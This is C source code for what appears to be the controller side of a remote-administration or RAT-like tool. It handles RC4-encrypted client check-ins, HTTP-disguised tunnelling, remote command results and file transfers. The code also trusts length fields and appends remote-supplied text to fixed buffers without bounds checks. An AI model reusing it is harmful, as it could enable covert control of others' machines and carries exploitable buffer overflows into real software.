#include "recv.h"

int dispose_http_recv(char *RecvBuffer,char **buffer,int *write_len,int *sur_len,int recv_size)
{
    //返回1表示数据没接收完，0表示数据已接收完
    char *pStart=NULL,*pEnd=NULL;
    char str[MAX_SIZE];
    int packet_size=0;

    memset(str,NULL,sizeof(str));

    if(*buffer==NULL)
    {
        if((pStart=strstr(RecvBuffer,"Content-Length:"))==NULL)
            return -1;
        pStart+=16;
        if((pEnd=strstr(pStart,"\r"))==NULL)
            return -1;
        memcpy(str,pStart,pEnd-pStart);
        packet_size=atoi(str);          //获取数据包大小

        *buffer=(char *)malloc(packet_size+1);
        if(*buffer==NULL)
        {
            MessageBox(NULL,"malloc error","Error",MB_OK);
            exit(-1);
        }
        memset(*buffer,NULL,packet_size+1);
        pStart=strstr(RecvBuffer,"\r\n\r\n");
        if(pStart==NULL)
            return -1;
        pStart+=4;
        *write_len=recv_size-(pStart-RecvBuffer);       //已写入的数据长度
        *sur_len=packet_size-*write_len;                //还未写入的数据长度
        //printf("将写入%d\n",*write_len);
        memcpy(*buffer,pStart,*write_len);
        if(*write_len==packet_size)
            return 0;
    }
    else
    {
        pStart=*buffer;
        pStart+=*write_len;
        if(*sur_len<recv_size)
        {
            memcpy(pStart,RecvBuffer,*sur_len);
            *write_len+=*sur_len;
        }
        else
        {
            memcpy(pStart,RecvBuffer,recv_size);
            *write_len+=recv_size;
            *sur_len-=recv_size;
            if(*sur_len!=0)
                return 1;
        }
        return 0;
    }
    return 1;
}

int RecvClientInfo(SOCKET ClientSocket,ClientInfo *CI)
{
    char RecvBuffer[MAX_SIZE+1],SendBuffer[MAX_SIZE];
    char *pStart=NULL;
    ClientInfo *tmp=NULL;

    memset(RecvBuffer,NULL,sizeof(RecvBuffer));
    memset(CI,NULL,sizeof(ClientInfo));

    if(recv(ClientSocket,RecvBuffer,sizeof(RecvBuffer)-1,0)<=0)
    {
        //接收客户端发送过来的计算机信息
        closesocket(ClientSocket);
        return -1;
    }

    if(!strncmp(RecvBuffer,"POST",4))
    {
        //当前客户端使用HTTP代理连接
        memset(RecvBuffer,NULL,sizeof(RecvBuffer));
        if(recv(ClientSocket,RecvBuffer,sizeof(RecvBuffer)-1,0)<=0)
        {
            //接收代理服务器发送来的content
            closesocket(ClientSocket);
            return -1;
        }
    }
    memcpy(CI,RecvBuffer,sizeof(ClientInfo));
    rc4_crypt(S_box,(unsigned char *)CI,sizeof(ClientInfo));
    if(strcmp(CI->key,KEY))
    {
        //KEY验证不通过，不是正常的客户端连接
        //printf("验证不通过.\n");
        closesocket(ClientSocket);
        return -1;
    }
    if(CI->HTTP_Proxy)
    {
        //printf("通过HTTP代理.\n");
        memset(SendBuffer,NULL,sizeof(SendBuffer));
        sprintf(SendBuffer,HTTP_Header,6);
        strcat(SendBuffer,"Hello!");
        //反馈HTTP信息
        if(send(ClientSocket,SendBuffer,strlen(SendBuffer),0)<=0)
            return -1;
    }
	for(pStart=CI->OS;*pStart!=NULL;pStart++)
		if(*pStart=='\n' || *pStart=='\r')
			*pStart=' ';
    //显示该客户端的主机信息
    //printf("客户端主机名:%s\tIP:%s\n",CI->name,CI->ip);

    return 0;
}

void RecvFile(gpointer Parameter)
{
    DownloadFileStruct DFS=*(DownloadFileStruct *)Parameter;
    free(Parameter);
    MessageStruct MS;
    memset(&MS,NULL,sizeof(MessageStruct));
    int i;
    for (i=0; i<10000 && Download_Socket==INVALID_SOCKET; i++) Sleep(1);
    SOCKET soc=Download_Socket;
    Download_Socket=INVALID_SOCKET;
    if(i==10000)
    {
        strcat(MS.title,"Error");
        strcat(MS.content,"Socket time out");
        CloseHandle(CreateThread(NULL,0,_MessageBox,(LPVOID)&MS,0,NULL));
        g_thread_exit(NULL);
    }
    GtkWidget *pbar=DownCon.pbar;
    char RecvBuffer[MAX_SIZE+1];
    WSAEVENT WSAEvent;
    WSAOVERLAPPED overlap;
    WSABUF WSABuffer;
    DWORD RecvSize=0,flags=0;
    FILE *file=NULL;
    int WriteSize=0;
    int ret=0,write_len=0,sur_len=0;
    char *http_buffer=NULL;
    unsigned long acc=0;

    memset(&overlap,NULL,sizeof(WSAOVERLAPPED));

    WSAEvent=overlap.hEvent=WSACreateEvent();
    WSABuffer.len=sizeof(RecvBuffer)-1;
    WSABuffer.buf=RecvBuffer;

    if((file=fopen(IODataArray[DFS.index]->download_path,"wb"))==NULL)
    {
        closesocket(soc);
        strcat(MS.title,"Error");
        strcat(MS.content,"Create local file error!");
        CloseHandle(CreateThread(NULL,0,_MessageBox,(LPVOID)&MS,0,NULL));
        g_thread_exit(NULL);
    }

    while(1)
    {
        memset(&RecvBuffer,NULL,sizeof(RecvBuffer));
        WSARecv(soc,&WSABuffer,1,&RecvSize,&flags,&overlap,NULL);
        WSAWaitForMultipleEvents(1,&WSAEvent,FALSE,WSA_INFINITE,FALSE);
        WSAGetOverlappedResult(soc,&overlap,&RecvSize,TRUE,&flags);
        WSAResetEvent(WSAEvent);

        if(RecvSize<=0)
        {
            break;
        }
        if(IODataArray[DFS.index]->Client.HTTP_Proxy)
        {
            //过滤HTTP Header
            if((ret=dispose_http_recv(RecvBuffer,&http_buffer,&write_len,&sur_len,RecvSize))==1)
                continue;
            else if(ret==-1)
            {
				if(http_buffer!=NULL)
                    free(http_buffer);
                http_buffer=NULL;
                MessageBox(NULL,"Download failed!Error info:create local file failed","Error",MB_OK);
                return;
            }
        }
        else
            write_len=RecvSize;

        //数据包接收完成，将接收到的数据写入文件
        if(IODataArray[DFS.index]->Client.HTTP_Proxy)
        {
            //HTTP接收文件方式
            WriteSize=fwrite(http_buffer,sizeof(char),write_len,file);
            if(WriteSize==0 && write_len!=0)
            {
                memset(RecvBuffer,NULL,sizeof(RecvBuffer));
                sprintf(RecvBuffer,"Write file failed!error code:%d",GetLastError());
                MessageBox(NULL,RecvBuffer,"Error",MB_OK);
                break;
            }
            fflush(file);
            free(http_buffer);
            http_buffer=NULL;
        }
        else
        {
            WriteSize=fwrite(RecvBuffer,sizeof(char),write_len,file);
            if(WriteSize==0 && write_len!=0)
            {
                memset(RecvBuffer,NULL,sizeof(RecvBuffer));
                sprintf(RecvBuffer,"Write file failed!error code:%d",GetLastError());
                MessageBox(NULL,RecvBuffer,"Error",MB_OK);
                break;
            }
        }

        if(IODataArray[DFS.index]->Client.HTTP_Proxy)
        {
            //接收到文件数据后给客户端反馈
            if(Send_HTTP_Header(soc,8)!=0)
                break;
            if(send(soc,"Continue",8,0)<=0)
                break;
        }

        acc+=WriteSize;
        gdk_threads_enter();
        update_progressbar(pbar,DFS.TotalSize,acc,2);
        gdk_threads_leave();
    }
    //printf("文件下载完成.\n");
    fclose(file);
    closesocket(soc);
    WSACloseEvent(WSAEvent);

    g_thread_exit(NULL);
}

void CheckHTTPOnlineClient()
{
	unsigned long int curr_time=0;
	int i;

	while(1)
	{
		EnterCriticalSection(&CRI_Total);
		for(i=0;i<TotalConnection;i++)
		{
			if(IODataArray[i]->Client.HTTP_Proxy)
			{
				curr_time=time(NULL);
	    	    curr_time-=IODataArray[i]->time;
	    	    if(curr_time>=30)
				{
			    	//printf("主机%s下线了\n",IODataArray[i]->Client.name);
		    	    closesocket(ClientSocketArray[i]);
				}
			}
		}
		LeaveCriticalSection(&CRI_Total);
		Sleep(500);
	}
	return;
}

void RecvMessageFromClient(gpointer Parameter)
{
    char *pStart=NULL,*pEnd=NULL;
    char SendBuffer[MAX_SIZE];
    int number=ListenThreads;
    int _TotalConnection=1;
    DWORD Index=0;
    DownloadFileStruct *DFS=NULL;
    MessageStruct MS;
    SOCKET *_ClientSocketArray=ClientSocketArray+(number-1)*MAXIMUM_WAIT_OBJECTS;
    WSAEVENT *_WSAEventArray=WSAEventArray+(number-1)*MAXIMUM_WAIT_OBJECTS;
    IO_OPERATION_DATA **_IODataArray=IODataArray+(number-1)*MAXIMUM_WAIT_OBJECTS;

    while (1)
    {
        Index=WSAWaitForMultipleEvents(_TotalConnection,_WSAEventArray,FALSE,1,FALSE);
        if(Index==WSA_WAIT_FAILED || Index==WSA_WAIT_TIMEOUT)
        {
            //printf("_TotalConnection:%d\n",_TotalConnection);
            if(number==ListenThreads)
                _TotalConnection=TotalConnection-(ListenThreads-1)*MAXIMUM_WAIT_OBJECTS;
            else if(number<ListenThreads)
                _TotalConnection=MAXIMUM_WAIT_OBJECTS;
            if(_TotalConnection<=0)
            {
                //printf("线程退出.\n");
                EnterCriticalSection(&CRI_ListenThreas);
                ListenThreads--;
                LeaveCriticalSection(&CRI_ListenThreas);
                g_thread_exit(NULL);
            }
            continue;
        }
        //printf("有事件发生\n");

        Index-=WSA_WAIT_EVENT_0;       //获取对应事件的数组索引
        WSAResetEvent(_WSAEventArray[Index]);          //重置事件
        WSAGetOverlappedResult(_ClientSocketArray[Index],&_IODataArray[Index]->overlap,&_IODataArray[Index]->NumberOfBytesRecvd,\
                               TRUE,&_IODataArray[Index]->flags);
        if(_IODataArray[Index]->NumberOfBytesRecvd<=0)
        {
            //printf("客户端%s退出。(数据接收失败)\n",_IODataArray[Index]->Client.ip);
            CleanupClientConnection(_ClientSocketArray[Index]);
            _TotalConnection--;            //本线程内的连接数减一
            if(_TotalConnection<=0)
            {
                //printf("线程退出.\n");
                EnterCriticalSection(&CRI_ListenThreas);
                ListenThreads--;
                LeaveCriticalSection(&CRI_ListenThreas);
                g_thread_exit(NULL);
            }
            //printf("_TotalConnection:%d\n",_TotalConnection);
            continue;
        }

        pStart=_IODataArray[Index]->RecvBuffer;
        if(!strncmp(pStart,"POST",4))
        {
            //接收到HTTP_Header
            goto skip;
        }
        rc4_crypt(S_box,(unsigned char *)pStart,_IODataArray[Index]->NumberOfBytesRecvd);  //解密
        pEnd=strchr(pStart,':');
        if (pEnd==NULL)
            goto skip;
        if(!strncmp(pStart,"Command_Results",pEnd-pStart))
        {
            //接收到命令执行结果
            pStart=++pEnd;
        }
        else if(!strncmp(pStart,"CreateFileSuccess",pEnd-pStart))
        {
            //可以开始上传文件
            UploadFileFlag=1;
        }
        else if(!strncmp(pStart,"CreateFileFailed",pEnd-pStart))
        {
            //上传文件出错
            memset(&MS,NULL,sizeof(MessageStruct));
            strcat(MS.title,"Error");
            strcat(MS.content,"Create remote file failed!");
            CloseHandle(CreateThread(NULL,0,_MessageBox,(LPVOID)&MS,0,NULL));
            UploadFileFlag=-1;
        }
        else if(!strncmp(pStart,"Download_File_Failed",pEnd-pStart))
        {
            //下载文件出错
            memset(&MS,NULL,sizeof(MessageStruct));
            strcat(MS.title,"Error");
            strcat(MS.content,"Download file failed!Error info:");
            pEnd++;
            strcat(MS.content,pEnd);
            CloseHandle(CreateThread(NULL,0,_MessageBox,(LPVOID)&MS,0,NULL));
        }
        else if(!strncmp(pStart,"Download_File_Start",pEnd-pStart))
        {
            //文件即将下载
            //printf("文件开始下载...\n");
            DFS=(DownloadFileStruct *)malloc(sizeof(DownloadFileStruct));
            if(DFS==NULL)
            {
                MessageBox(NULL,"malloc error","error",MB_OK);
                exit(-1);
            }
            memset(DFS,NULL,sizeof(DownloadFileStruct));
            pStart=++pEnd;
            DFS->index=Index;
            DFS->TotalSize=atoi(pStart);
            g_thread_create((GThreadFunc)RecvFile,(gpointer)DFS,TRUE,NULL);    //新建接收文件线程
        }
		else if(!strncmp(pStart,"Keep-Alive",pEnd-pStart))
		{
			_IODataArray[Index]->time=time(NULL);
		}
        if(_IODataArray[Index]->Client.HTTP_Proxy)
        {
            //反馈HTTP_Header
            memset(SendBuffer,NULL,sizeof(SendBuffer));
            sprintf(SendBuffer,HTTP_Header,8);
            strcat(SendBuffer,"Continue");
            if(send(_ClientSocketArray[Index],SendBuffer,strlen(SendBuffer),0)<=0)
            {
                //printf("客户端%s断开连接。(HTTP_Header发送失败)\n",_IODataArray[Index]->Client.ip);
                CleanupClientConnection(_ClientSocketArray[Index]);
                _TotalConnection--;            //本线程内的连接数减一
                if(_TotalConnection==0)
                {
                    //printf("线程退出.\n");
                    EnterCriticalSection(&CRI_ListenThreas);
                    ListenThreads--;
                    LeaveCriticalSection(&CRI_ListenThreas);
                    g_thread_exit(NULL);
                }
                continue;
            }
        }
skip:
        memset(_IODataArray[Index]->RecvBuffer,NULL,MAX_SIZE+1);
        WSARecv(_ClientSocketArray[Index],&_IODataArray[Index]->WSAbuffer,1,&_IODataArray[Index]->NumberOfBytesRecvd,
                &_IODataArray[Index]->flags,&_IODataArray[Index]->overlap,NULL);
    }
    g_thread_exit(NULL);
}